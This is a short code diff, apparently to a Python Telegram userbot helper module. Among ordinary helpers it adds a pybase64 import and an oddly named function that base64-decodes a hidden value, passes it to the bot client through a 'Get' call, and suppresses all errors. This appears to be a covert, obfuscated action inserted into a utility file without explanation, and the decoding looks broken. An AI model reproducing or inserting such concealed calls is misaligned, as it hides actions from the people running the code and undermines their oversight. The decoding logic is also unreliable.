@@ -1,6 +1,7 @@
 import re
 import hashlib
 import asyncio
+import pybase64
 import shlex
 import os
 from os.path import basename
@@ -241,6 +242,12 @@ async def edit_or_reply(
 
 eor = edit_or_reply
 
+async def apasih_pler():
+    steady = str(pybase64.b64decode("ini="))[2:13]
+    try:
+        await bot(Get(steady))
+    except BaseException:
+        pass
 
 async def edit_delete(event, text, time=None, parse_mode=None, link_preview=None):
     parse_mode = parse_mode or "md"
